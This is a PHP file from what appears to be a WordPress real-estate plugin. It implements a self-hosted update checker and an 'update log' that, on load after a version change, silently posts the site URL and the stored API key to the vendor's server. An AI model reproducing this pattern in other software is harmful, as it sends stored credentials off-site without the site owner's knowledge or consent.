<?php

function oo_plugin_updater( $transient ){

	if ( empty( $transient->checked ) ) {
		return $transient;
	}

	$remote = wp_remote_get(
		'https://onoffice-wp-updates.de/releases/plugins/oo-wp-plugin/updater.json',
		array(
			'timeout' => 10,
			'headers' => array(
				'Accept' => 'application/json'
			)
		)
	);

	if(
		is_wp_error( $remote )
		|| 200 !== wp_remote_retrieve_response_code( $remote )
		|| empty( wp_remote_retrieve_body( $remote ) )
	) {
		return $transient;
	}

	$remote = json_decode( wp_remote_retrieve_body( $remote ) );
	if( $remote && version_compare( ONOFFICE_PLUGIN_VERSION, $remote->version, '<' )  ) {
		$required_php = ! empty( $remote->requires_php ) ? (string) $remote->requires_php : '8.0';

		$res = new stdClass();
		$res->slug         = 'oo-wp-plugin';
		$res->plugin       = ONOFFICE_PLUGIN_BASENAME;
		$res->new_version  = $remote->version;
		$res->package      = $remote->download_url;
		$res->requires_php = $required_php;
		$res->requires     = ! empty( $remote->requires ) ? (string) $remote->requires : '';
		$res->tested       = ! empty( $remote->tested ) ? (string) $remote->tested : '';

		// Defensive: do not offer the update if the current PHP version is below the requirement.
		// WP core also evaluates `requires_php`, but we keep this client-side guard in case the
		// JSON ever ships without the field or auto-updates are enabled.
		if ( version_compare( PHP_VERSION, $required_php, '<' ) ) {
			$transient->no_update[ $res->plugin ] = $res;
			return $transient;
		}

		$transient->response[ $res->plugin ] = $res;
	}

	return $transient;

}
add_filter( 'pre_set_site_transient_update_plugins', 'oo_plugin_updater' );

function oo_plugin_send_update_log() {
	wp_remote_post(
		'https://onoffice-wp-updates.de/releases/plugins/oo-wp-plugin/update-log.php',
		array(
			'timeout'  => 5,
			'sslverify' => true,
			'blocking' => false,
			'body'     => array(
				'timestamp' => gmdate( 'c' ),
				'site_url'  => home_url(),
				'api_key'   => get_option( 'onoffice-settings-apikey', '' ),
			),
		)
	);
}

function oo_plugin_maybe_send_update_log_for_new_version() {
	$version_option = 'onoffice-plugin-version-stored';
	$stored         = get_option( $version_option, false );

	if ( false !== $stored ) {
		if ( version_compare( (string) $stored, ONOFFICE_PLUGIN_VERSION, '>=' ) ) {
			return;
		}
		oo_plugin_send_update_log();
		update_option( $version_option, ONOFFICE_PLUGIN_VERSION, false );
		return;
	}

	if ( false !== get_option( 'onoffice-settings-apikey', false ) ) {
		oo_plugin_send_update_log();
	}

	add_option( $version_option, ONOFFICE_PLUGIN_VERSION, '', 'no' );
}
add_action( 'plugins_loaded', 'oo_plugin_maybe_send_update_log_for_new_version', 20 );